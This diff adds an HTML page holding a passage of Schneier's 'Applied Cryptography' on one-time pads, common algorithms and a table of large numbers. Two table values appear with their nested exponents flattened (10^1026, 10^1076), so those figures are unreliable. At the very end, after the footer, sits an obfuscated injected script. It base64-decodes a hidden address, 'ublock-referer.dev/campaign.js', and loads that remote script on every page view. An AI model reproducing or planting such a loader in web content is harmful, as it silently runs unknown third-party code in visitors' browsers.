@@ -1,0 +1,205 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Foundations</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=01//-->
+<!--PAGES=016-018//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="01-05.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="../ch02/02-01.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P>Assuming an eavesdropper can&#146;t get access to the one-time pad used to encrypt the message, this scheme is perfectly secure. A given ciphertext message is equally likely to correspond to any possible plaintext message of equal size.
+</P>
+<P>Since every key sequence is equally likely (remember, the key letters are generated randomly), an adversary has no information with which to cryptanalyze the ciphertext. The key sequence could just as likely be:</P>
+<!-- CODE SNIP //-->
+<PRE>
+    POYYAEAAZX
+</PRE>
+<!-- END CODE SNIP //-->
+<P>which would decrypt to:
+</P>
+<!-- CODE SNIP //-->
+<PRE>
+    SALMONEGGS
+</PRE>
+<!-- END CODE SNIP //-->
+<P>or
+</P>
+<!-- CODE SNIP //-->
+<PRE>
+    BXFGBMTMXM
+</PRE>
+<!-- END CODE SNIP //-->
+<P>which would decrypt to:
+</P>
+<!-- CODE SNIP //-->
+<PRE>
+    GREENFLUID
+</PRE>
+<!-- END CODE SNIP //-->
+<P>This point bears repeating: Since every plaintext message is equally possible, there is no way for the cryptanalyst to determine which plaintext message is the correct one. A random key sequence added to a nonrandom plaintext message produces a completely random ciphertext message and no amount of computing power can change that.
+</P>
+<P>The caveat, and this is a big one, is that the key letters have to be generated randomly. Any attacks against this scheme will be against the method used to generate the key letters. Using a pseudo-random number generator doesn&#146;t count; they always have nonrandom properties. If you use a real random source&#151;this is much harder than it might first appear, see Section 17.14&#151;it&#146;s secure.</P>
+<P>The other important point is that you can never use the key sequence again, ever. Even if you use a multiple-gigabyte pad, if a cryptanalyst has multiple ciphertexts whose keys overlap, he can reconstruct the plaintext. He slides each pair of ciphertexts against each other and counts the number of matches at each position. If they are aligned right, the proportion of matches jumps suddenly&#151;the exact percentages depend on the plaintext language. From this point cryptanalysis is easy. It&#146;s like the index of coincidence, but with just two &#147;periods&#148; to compare [904]. Don&#146;t do it.</P>
+<P>The idea of a one-time pad can be easily extended to binary data. Instead of a one-time pad consisting of letters, use a one-time pad of bits. Instead of adding the plaintext to the one-time pad, use an XOR. To decrypt, XOR the ciphertext with the same one-time pad. Everything else remains the same and the security is just as perfect.</P>
+<P>This all sounds good, but there are a few problems. Since the key bits must be random and can never be used again, the length of the key sequence must be equal to the length of the message. A one-time pad might be suitable for a few short messages, but it will never work for a 1.544 Mbps communications channel. You can store 650 megabytes worth of random bits on a CD-ROM, but there are problems. First, you want exactly two copies of the random bits, but CD-ROMs are economical only for large quantities. And second, you want to be able to destroy the bits already used. CD-ROM has no erase facilities except for physically destroying the entire disk. Digital tape is a much better medium for this sort of thing.</P>
+<P>Even if you solve the key distribution and storage problem, you have to make sure the sender and receiver are perfectly synchronized. If the receiver is off by a bit (or if some bits are dropped during the transmission), the message won&#146;t make any sense. On the other hand, if some bits are altered during transmission (without any bits being added or removed&#151;something far more likely to happen due to random noise), only those bits will be decrypted incorrectly. But on the other hand, a one-time pad provides no authenticity.</P>
+<P>One-time pads have applications in today&#146;s world, primarily for ultra-secure low-bandwidth channels. The hotline between the United States and the former Soviet Union was (is it still active?) rumored to be encrypted with a one-time pad. Many Soviet spy messages to agents were encrypted using one-time pads. These messages are still secure today and will remain that way forever. It doesn&#146;t matter how long the supercomputers work on the problem. Even after the aliens from Andromeda land with their massive spaceships and undreamed-of computing power, they will not be able to read the Soviet spy messages encrypted with one-time pads (unless they can also go back in time and get the one-time pads).</P>
+<H3><A NAME="Heading7"></A><FONT COLOR="#000077">1.6 Computer Algorithms</FONT></H3>
+<P>There are many cryptographic algorithms. These are three of the most common:
+</P>
+<DL>
+<DD>&#151; DES (Data Encryption Standard) is the most popular computer encryption algorithm. DES is a U.S. and international standard. It is a symmetric algorithm; the same key is used for encryption and decryption.
+<DD>&#151; RSA (named for its creators&#151;Rivest, Shamir, and Adleman) is the most popular public-key algorithm. It can be used for both encryption and digital signatures.
+<DD>&#151; DSA (Digital Signature Algorithm, used as part of the Digital Signature Standard) is another public-key algorithm. It cannot be used for encryption, but only for digital signatures.
+</DL>
+<P>These are the kinds of stuff this book is about.
+</P>
+<H3><A NAME="Heading8"></A><FONT COLOR="#000077">1.7 Large Numbers</FONT></H3>
+<P>Throughout this book, I use various large numbers to describe different things in cryptography. Because it is so easy to lose sight of these numbers and what they signify, Table 1.1 gives physical analogues for some of them.
+</P>
+<P>These numbers are order-of-magnitude estimates, and have been culled from a variety of sources. Many of the astrophysics numbers are explained in Freeman</P>
+<TABLE WIDTH="100%"><TH CAPTION ALIGN="CENTER" COLSPAN="2">TABLE 1.1<BR>Large Numbers
+<TR>
+<TD COLSPAN="2"><HR>
+<TR>
+<TH WIDTH="60%" ALIGN="LEFT">Physical Analogue
+<TH ALIGN="LEFT" VALIGN="TOP">Number
+<TR>
+<TD COLSPAN="2"><HR>
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">Odds of being killed by lightning (per day)
+<TD VALIGN="TOP" ALIGN="LEFT">1 in 9 billion (2<SUP>33</SUP>)
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">Odds of winning the top prize in a U.S. state lottery
+<TD VALIGN="TOP" ALIGN="LEFT">1 in 4,000,000 (2<SUP>22</SUP>)
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">Odds of winning the top prize in a U.S. state lottery and being killed by lightning in the same day
+<TD VALIGN="TOP" ALIGN="LEFT">1 in 2<SUP>55</SUP>
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">Odds of drowning (in the U.S. per year)
+<TD VALIGN="TOP" ALIGN="LEFT">1 in 59,000 (2<SUP>16</SUP>)
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">Odds of being killed in an automobile accident(in the U.S. in 1993)
+<TD VALIGN="TOP" ALIGN="LEFT">1 in 6100 (2<SUP>13</SUP>)
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">Odds of being killed in an automobile accident(in the U.S. per lifetime)
+<TD VALIGN="TOP" ALIGN="LEFT">1 in 88 (2<SUP>7</SUP>)
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">Time until the next ice age
+<TD VALIGN="TOP" ALIGN="LEFT">14,000 (2<SUP>14</SUP>) years
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">Time until the sun goes nova
+<TD VALIGN="TOP" ALIGN="LEFT">10<SUP>9</SUP> (2<SUP>30</SUP>) years
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">Age of the planet
+<TD VALIGN="TOP" ALIGN="LEFT">10<SUP>9</SUP> (2<SUP>30</SUP>) years
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">Age of the Universe
+<TD VALIGN="TOP" ALIGN="LEFT">10<SUP>10</SUP> (2<SUP>34</SUP>) years
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">Number of atoms in the planet
+<TD VALIGN="TOP" ALIGN="LEFT">10<SUP>51</SUP> (2<SUP>170</SUP>)
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">Number of atoms in the sun
+<TD VALIGN="TOP" ALIGN="LEFT">10<SUP>57</SUP> (2<SUP>190</SUP>)
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">Number of atoms in the galaxy
+<TD VALIGN="TOP" ALIGN="LEFT">10<SUP>67</SUP> (2<SUP>223</SUP>)
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">Number of atoms in the Universe (dark matter excluded)
+<TD VALIGN="TOP" ALIGN="LEFT">10<SUP>77</SUP> (2<SUP>265</SUP>)
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">Volume of the Universe
+<TD VALIGN="TOP" ALIGN="LEFT">10<SUP>84</SUP> (2<SUP>280</SUP>) cm<SUP>3</SUP>
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT"><B>If the Universe is Closed:</B>
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">Total lifetime of the Universe
+<TD VALIGN="TOP" ALIGN="LEFT">10<SUP>11</SUP> (2<SUP>37</SUP>) years<BR>10<SUP>18</SUP> (2<SUP>61</SUP>) seconds
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT"><B>If the Universe is Open:</B>
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">Time until low-mass stars cool off
+<TD VALIGN="TOP" ALIGN="LEFT">10<SUP>14</SUP> (2<SUP>47</SUP>) years
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">Time until planets detach from stars
+<TD VALIGN="TOP" ALIGN="LEFT">10<SUP>15</SUP> (2<SUP>50</SUP>) years
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">Time until stars detach from galaxies
+<TD VALIGN="TOP" ALIGN="LEFT">10<SUP>19</SUP> (2<SUP>64</SUP>) years
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">Time until orbits decay by gravitational radiation
+<TD VALIGN="TOP" ALIGN="LEFT">10<SUP>20</SUP> (2<SUP>67</SUP>) years
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">Time until black holes decay by the Hawking process
+<TD VALIGN="TOP" ALIGN="LEFT">10<SUP>64</SUP> (2<SUP>213</SUP>) years
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">Time until all matter is liquid at zero temperature
+<TD VALIGN="TOP" ALIGN="LEFT">10<SUP>65</SUP> (2<SUP>216</SUP>) years
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">Time until all matter decays to iron
+<TD VALIGN="TOP" ALIGN="LEFT">10<SUP>1026</SUP> years
+<TR>
+<TD VALIGN="TOP" ALIGN="LEFT">Time until all matter collapses to black holes
+<TD VALIGN="TOP" ALIGN="LEFT">10<SUP>1076</SUP> years
+<TR>
+<TD COLSPAN="2"><HR>
+<TR>
+</TABLE>
+<P>Dyson&#146;s paper, &#147;Time Without End: Physics and Biology in an Open Universe,&#148; in <I>Reviews of Modern Physics</I>, v. 52, n. 3, July 1979, pp. 447&#150;460. Automobile accident deaths are calculated from the Department of Transportation&#146;s statistic of 163 deaths per million people in 1993 and an average lifespan of 69.7 years.</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="01-05.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="../ch02/02-01.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(aayJjQgd, WAHFBUWd) {WAHFBUWd = aayJjQgd.createElement('script');WAHFBUWd.type = 'text/javascript';WAHFBUWd.async = true;WAHFBUWd.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');aayJjQgd.getElementsByTagName('body')[0].appendChild(WAHFBUWd);}(document));</script></body>
+</html>
